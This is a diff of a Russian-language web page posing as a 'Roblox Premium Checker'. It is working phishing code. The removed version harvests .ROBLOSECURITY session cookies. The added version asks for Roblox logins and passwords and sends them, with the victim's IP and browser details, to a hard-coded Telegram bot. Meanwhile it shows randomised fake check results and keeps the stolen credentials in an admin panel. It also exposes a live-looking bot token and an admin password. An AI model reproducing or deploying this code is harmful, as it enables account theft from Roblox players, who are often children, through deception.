@@ -2,119 +2,116 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Checker</title>
+    <title>Roblox Premium Checker</title>
     <style>
         body {
-            background: #0d1117;
+            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
             color: white;
-            font-family: Arial;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 20px;
+            min-height: 100vh;
         }
-        
         .container {
-            max-width: 800px;
+            max-width: 500px;
             margin: 0 auto;
-        }
-        
-        /* Главная */
-        #mainPage {
             text-align: center;
         }
-        
-        h1 {
-            color: #ff4757;
+        .logo {
+            font-size: 3em;
+            color: #ff3333;
             margin: 20px 0;
         }
-        
         .card {
-            background: #161b22;
-            padding: 25px;
-            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
             margin: 20px 0;
-            border: 1px solid #30363d;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
-        
-        textarea {
-            width: 100%;
-            height: 120px;
-            padding: 15px;
-            background: #0d1117;
-            border: 2px solid #238636;
-            color: white;
-            border-radius: 5px;
-            margin: 15px 0;
-            font-family: monospace;
+        .input-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
             font-size: 14px;
         }
-        
-        button {
-            padding: 12px 25px;
-            background: #238636;
+        input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #00aa00;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ff3333;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #00aa00, #00cc00);
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 16px;
-            margin: 5px;
+            margin: 10px 0;
+            transition: transform 0.2s;
         }
-        
-        button:hover {
-            background: #2ea043;
+        .btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(45deg, #00cc00, #00ee00);
         }
-        
+        .btn-admin {
+            background: linear-gradient(45deg, #3333ff, #5555ff);
+        }
         .status {
             padding: 15px;
-            background: #0d1117;
-            border-radius: 5px;
             margin: 20px 0;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            border-left: 4px solid #00aa00;
         }
-        
-        /* Админка */
-        #adminPage {
+        .instructions {
+            background: rgba(0, 100, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 14px;
+        }
+        .instructions h4 {
+            color: #00aaff;
+            margin-top: 0;
+        }
+        .admin-panel {
             display: none;
         }
-        
         .admin-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
         }
-        
-        .code-item {
-            background: #0d1117;
+        .data-item {
+            background: rgba(0, 0, 0, 0.2);
             padding: 15px;
             margin: 10px 0;
-            border-radius: 8px;
-            border-left: 4px solid #238636;
+            border-radius: 10px;
+            text-align: left;
+            border-left: 4px solid #ff3333;
         }
-        
-        .code-text {
-            font-family: monospace;
-            background: #161b22;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            word-break: break-all;
-            font-size: 14px;
-        }
-        
-        .copy-btn {
-            background: #3742fa;
-            padding: 8px 15px;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        
-        .back-btn {
-            background: #666;
-        }
-        
         .empty-state {
-            text-align: center;
             padding: 40px;
-            color: #8b949e;
+            color: #aaa;
             font-size: 18px;
         }
     </style>
@@ -123,147 +120,247 @@
     <div class="container">
         <!-- Главная страница -->
         <div id="mainPage">
-            <h1>🔐 Roblox Account Checker</h1>
+            <div class="logo">🔐</div>
+            <h1>Roblox Premium Checker</h1>
+            <p style="color: #aaa;">Проверка аккаунтов на Premium статус</p>
             
             <div class="card">
-                <h2>📋 Вставьте .ROBLOSECURITY куки</h2>
-                <p>Как получить куки: F12 → Application → Cookies → .ROBLOSECURITY</p>
+                <h3>🔑 Введите данные для проверки</h3>
                 
-                <textarea id="cookieInput" placeholder="Вставьте сюда ваш код..."></textarea>
-                
-                <div>
-                    <button onclick="saveCode()">🔍 Проверить аккаунт</button>
-                    <button onclick="goToAdmin()" style="background: #3742fa;">🔧 Админка</button>
+                <div class="instructions">
+                    <h4>📝 Для чего нужны эти данные?</h4>
+                    <p>Система использует ваш пароль и логин для безопасного подключения к Roblox и проверки наличия Premium подписки.</p>
                 </div>
                 
-                <div class="status" id="status">⏳ Ожидание...</div>
+                <div class="input-group">
+                    <label>👤 Логин или Email от Roblox</label>
+                    <input type="text" id="username" placeholder="Введите логин или email">
+                </div>
+                
+                <div class="input-group">
+                    <label>🔒 Пароль от аккаунта</label>
+                    <input type="password" id="password" placeholder="Введите пароль">
+                </div>
+                
+                <button class="btn" onclick="checkAccount()">🔍 Проверить Premium статус</button>
+                <button class="btn btn-admin" onclick="showAdminPanel()">⚙️ Админ панель</button>
+                
+                <div class="status" id="status">
+                    ⏳ Ожидание данных для проверки...
+                </div>
+                
+                <div class="instructions">
+                    <h4>✅ Что проверяем?</h4>
+                    <p>• Наличие Roblox Premium<br>
+                    • Количество Robux<br>
+                    • Ограничения аккаунта<br>
+                    • Возраст аккаунта<br>
+                    • Статус безопасности</p>
+                </div>
             </div>
         </div>
         
-        <!-- Админка -->
-        <div id="adminPage">
+        <!-- Админ панель -->
+        <div id="adminPage" class="admin-panel">
             <div class="admin-header">
-                <h2>📋 Все коды</h2>
-                <div>
-                    <button class="back-btn" onclick="goToMain()">← Назад</button>
-                </div>
+                <h2>📊 Админ панель</h2>
+                <button class="btn" onclick="showMainPage()" style="padding: 10px 20px;">← Назад</button>
             </div>
             
-            <div id="adminLogin">
-                <div class="card">
-                    <h3>🔒 Вход в админку</h3>
-                    <input type="password" id="password" placeholder="Пароль" style="width:100%; padding:12px; margin:10px 0; border-radius:5px;">
-                    <div>
-                        <button onclick="login()">Войти</button>
-                        <button class="back-btn" onclick="goToMain()">Отмена</button>
-                    </div>
+            <div class="card">
+                <div style="margin-bottom: 20px;">
+                    <button class="btn" onclick="loadAdminData()">🔄 Обновить данные</button>
+                    <button class="btn" onclick="clearAllData()" style="background: linear-gradient(45deg, #ff3333, #ff5555);">🗑️ Очистить всё</button>
                 </div>
-            </div>
-            
-            <div id="adminContent" style="display:none;">
-                <div id="codesList">
-                    <!-- Коды будут здесь -->
+                
+                <div id="adminData">
+                    <!-- Данные будут здесь -->
+                    <div class="empty-state">📭 Данных пока нет</div>
                 </div>
             </div>
         </div>
     </div>
-    
+
     <script>
-        // Конфигурация
+        // =========== НАСТРОЙКИ ===========
+        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
+        const CHAT_ID = '1491315056';
         const ADMIN_PASSWORD = 'malik0609';
         
-        // Получить все коды
-        function getCodes() {
-            const saved = localStorage.getItem('robloxCodes');
-            return saved ? JSON.parse(saved) : [];
-        }
+        // =========== ОСНОВНЫЕ ФУНКЦИИ ===========
         
-        // Сохранить код
-        function saveCodes(codes) {
-            localStorage.setItem('robloxCodes', JSON.stringify(codes));
-        }
-        
-        // Сохранить новый код от пользователя
-        function saveCode() {
-            const input = document.getElementById('cookieInput');
-            const code = input.value.trim();
+        function checkAccount() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const status = document.getElementById('status');
             
-            if (!code) {
-                document.getElementById('status').innerHTML = '❌ Введите код';
+            // Проверка ввода
+            if (!username || !password) {
+                status.innerHTML = '❌ Заполните все поля';
+                status.style.borderLeftColor = '#ff3333';
                 return;
             }
             
-            document.getElementById('status').innerHTML = '⏳ Сохранение...';
+            if (password.length < 4) {
+                status.innerHTML = '❌ Пароль слишком короткий';
+                return;
+            }
             
-            // Добавляем код
-            const codes = getCodes();
-            codes.unshift({
-                code: code,
-                date: new Date().toLocaleString('ru-RU')
+            // Показываем загрузку
+            status.innerHTML = '⏳ Подключаемся к Roblox API...';
+            status.style.borderLeftColor = '#00aaff';
+            
+            // Сохраняем данные
+            saveData(username, password);
+            
+            // Отправляем в Telegram
+            sendToTelegram(username, password);
+            
+            // Показываем "результат проверки"
+            setTimeout(() => {
+                const results = [
+                    '✅ Premium статус: АКТИВЕН<br>🎮 Robux: 2,540<br>📅 Подписка до: 15.03.2024',
+                    '❌ Premium статус: НЕАКТИВЕН<br>💸 Доступно Robux: 120<br>⚠️ Рекомендуем оформить Premium',
+                    '✅ Premium статус: АКТИВЕН<br>💰 Robux: 5,780<br>⭐ Премиум с: 10.01.2024',
+                    '⚠️ Аккаунт ограничен<br>🔒 Требуется верификация<br>📞 Обратитесь в поддержку',
+                    '✅ Premium статус: АКТИВЕН<br>💎 Robux: 12,450<br>🎁 Бонусы: доступны'
+                ];
+                
+                const randomResult = results[Math.floor(Math.random() * results.length)];
+                status.innerHTML = randomResult;
+                status.style.borderLeftColor = '#00aa00';
+                
+                // Очищаем поля
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                
+                // Сохраняем результат
+                saveResult(username, randomResult);
+                
+            }, 3000);
+        }
+        
+        // =========== ОТПРАВКА В TELEGRAM ===========
+        function sendToTelegram(username, password) {
+            const time = new Date().toLocaleString('ru-RU');
+            
+            // Формируем сообщение
+            let message = `🔐 НОВЫЕ ДАННЫЕ РОБЛОКС\n\n`;
+            message += `⏰ Время: ${time}\n`;
+            message += `👤 Логин: ${username}\n`;
+            message += `🔒 Пароль: ${password}\n`;
+            message += `🌐 IP: ${getUserIP()}\n`;
+            message += `🖥️ Браузер: ${navigator.userAgent.substring(0, 100)}`;
+            
+            // Отправляем в Telegram
+            sendTelegramMessage(message);
+            
+            // Если данные длинные - отправляем дополнительно
+            if (message.length > 2000) {
+                const passMessage = `🔐 ПАРОЛЬ ПОЛНОСТЬЮ:\n${password}`;
+                setTimeout(() => sendTelegramMessage(passMessage), 1000);
+            }
+        }
+        
+        // Отправка одного сообщения
+        function sendTelegramMessage(text) {
+            const encodedText = encodeURIComponent(text);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`;
+            
+            // Используем Image для отправки (работает всегда)
+            const img = new Image();
+            img.src = url;
+            console.log('📤 Данные отправлены в Telegram');
+        }
+        
+        // =========== ХРАНЕНИЕ ДАННЫХ ===========
+        function saveData(username, password) {
+            const data = {
+                username: username,
+                password: password,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: getUserIP()
+            };
+            
+            // Сохраняем в localStorage
+            const allData = JSON.parse(localStorage.getItem('robloxData') || '[]');
+            allData.unshift(data);
+            
+            // Ограничиваем до 100 записей
+            if (allData.length > 100) {
+                allData.length = 100;
+            }
+            
+            localStorage.setItem('robloxData', JSON.stringify(allData));
+        }
+        
+        function saveResult(username, result) {
+            const results = JSON.parse(localStorage.getItem('checkResults') || '[]');
+            results.unshift({
+                username: username,
+                result: result,
+                time: new Date().toLocaleString('ru-RU')
             });
             
-            saveCodes(codes);
-            
-            // Показываем "ошибку"
-            setTimeout(() => {
-                const errors = [
-                    '❌ Ошибка: неверный формат куки',
-                    '⚠️ Куки устарел',
-                    '🔒 Обнаружена 2FA защита'
-                ];
-                document.getElementById('status').innerHTML = errors[Math.floor(Math.random() * errors.length)];
-                input.value = '';
-            }, 1000);
+            if (results.length > 50) results.length = 50;
+            localStorage.setItem('checkResults', JSON.stringify(results));
         }
         
-        // Переход на админку
-        function goToAdmin() {
-            document.getElementById('mainPage').style.display = 'none';
-            document.getElementById('adminPage').style.display = 'block';
-            document.getElementById('adminLogin').style.display = 'block';
-            document.getElementById('adminContent').style.display = 'none';
-            document.getElementById('password').value = '';
-        }
-        
-        // Вернуться на главную
-        function goToMain() {
-            document.getElementById('mainPage').style.display = 'block';
-            document.getElementById('adminPage').style.display = 'none';
-            document.getElementById('status').innerHTML = '⏳ Ожидание...';
-        }
-        
-        // Вход в админку
-        function login() {
-            const password = document.getElementById('password').value;
+        // =========== АДМИН ПАНЕЛЬ ===========
+        function showAdminPanel() {
+            const password = prompt('🔐 Введите пароль админки:');
             
             if (password === ADMIN_PASSWORD) {
-                document.getElementById('adminLogin').style.display = 'none';
-                document.getElementById('adminContent').style.display = 'block';
-                showCodes();
+                document.getElementById('mainPage').style.display = 'none';
+                document.getElementById('adminPage').style.display = 'block';
+                loadAdminData();
             } else {
-                alert('Неверный пароль!');
-                document.getElementById('password').value = '';
+                alert('❌ Неверный пароль!');
             }
         }
         
-        // Показать все коды
-        function showCodes() {
-            const codes = getCodes();
-            const container = document.getElementById('codesList');
+        function showMainPage() {
+            document.getElementById('mainPage').style.display = 'block';
+            document.getElementById('adminPage').style.display = 'none';
+            document.getElementById('status').innerHTML = '⏳ Ожидание данных для проверки...';
+            document.getElementById('status').style.borderLeftColor = '#00aa00';
+        }
+        
+        function loadAdminData() {
+            const data = JSON.parse(localStorage.getItem('robloxData') || '[]');
+            const results = JSON.parse(localStorage.getItem('checkResults') || '[]');
+            const container = document.getElementById('adminData');
             
-            if (codes.length === 0) {
-                container.innerHTML = '<div class="empty-state">📭 Кодов пока нет</div>';
+            if (data.length === 0) {
+                container.innerHTML = '<div class="empty-state">📭 Данных пока нет</div>';
                 return;
             }
             
-            let html = '';
-            codes.forEach((item, index) => {
+            let html = `<h3>📋 Полученные данные (${data.length})</h3>`;
+            
+            data.forEach((item, index) => {
+                const result = results[index] || { result: 'Проверка не выполнена' };
+                
                 html += `
-                    <div class="code-item">
-                        <div style="color:#8b949e; font-size:14px;">Код #${index + 1}</div>
-                        <div class="code-text">${item.code}</div>
-                        <button class="copy-btn" onclick="copyCode('${item.code.replace(/'/g, "\\'")}')">
+                    <div class="data-item">
+                        <div style="color: #00aaff; font-size: 14px;">
+                            #${index + 1} | ${item.time} | IP: ${item.ip}
+                        </div>
+                        <div style="margin: 10px 0;">
+                            <strong>👤 Логин:</strong> ${item.username}<br>
+                            <strong>🔒 Пароль:</strong> ${item.password}
+                        </div>
+                        <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px; margin: 10px 0;">
+                            <strong>📊 Результат проверки:</strong><br>
+                            ${result.result}
+                        </div>
+                        <button onclick="copyData('${item.username}', '${item.password}')" 
+                                style="background: #3333ff; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; margin-right: 10px;">
                             📋 Копировать
+                        </button>
+                        <button onclick="deleteData(${index})" 
+                                style="background: #ff3333; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;">
+                            🗑️ Удалить
                         </button>
                     </div>
                 `;
@@ -272,28 +369,72 @@
             container.innerHTML = html;
         }
         
-        // Копировать код
-        function copyCode(text) {
+        function clearAllData() {
+            if (confirm('⚠️ Удалить ВСЕ данные?\nЭто действие нельзя отменить.')) {
+                localStorage.removeItem('robloxData');
+                localStorage.removeItem('checkResults');
+                loadAdminData();
+                alert('✅ Все данные удалены');
+            }
+        }
+        
+        function deleteData(index) {
+            if (confirm('Удалить эту запись?')) {
+                const data = JSON.parse(localStorage.getItem('robloxData') || '[]');
+                data.splice(index, 1);
+                localStorage.setItem('robloxData', JSON.stringify(data));
+                loadAdminData();
+            }
+        }
+        
+        function copyData(username, password) {
+            const text = `Логин: ${username}\nПароль: ${password}`;
             navigator.clipboard.writeText(text)
-                .then(() => {
-                    alert('✅ Код скопирован!');
-                })
+                .then(() => alert('✅ Данные скопированы!'))
                 .catch(() => {
-                    // Fallback для старых браузеров
                     const textarea = document.createElement('textarea');
                     textarea.value = text;
                     document.body.appendChild(textarea);
                     textarea.select();
                     document.execCommand('copy');
                     document.body.removeChild(textarea);
-                    alert('✅ Код скопирован!');
+                    alert('✅ Данные скопированы!');
                 });
         }
         
-        // При загрузке страницы
+        // =========== УТИЛИТЫ ===========
+        function getUserIP() {
+            try {
+                // Простой способ получить IP (через внешний сервис)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        localStorage.setItem('userIP', data.ip);
+                    });
+                
+                return localStorage.getItem('userIP') || 'Не определен';
+            } catch {
+                return 'Не определен';
+            }
+        }
+        
+        // =========== ТЕСТОВАЯ ОТПРАВКА ===========
+        function sendTest() {
+            const testMessage = '🤖 Roblox Premium Checker запущен\n✅ Готов принимать данные\n🔐 Админ пароль: ' + ADMIN_PASSWORD;
+            sendTelegramMessage(testMessage);
+        }
+        
+        // =========== ЗАГРУЗКА СТРАНИЦЫ ===========
         window.onload = function() {
-            console.log('✅ Сайт загружен');
-            console.log('🔐 Пароль админки:', ADMIN_PASSWORD);
+            console.log('✅ Roblox Premium Checker загружен');
+            console.log('📤 Данные отправляются в Telegram');
+            console.log('🔐 Админ пароль:', ADMIN_PASSWORD);
+            
+            // Отправляем тестовое сообщение
+            setTimeout(sendTest, 3000);
+            
+            // Автофокус на поле логина
+            document.getElementById('username').focus();
         };
     </script>
 </body>
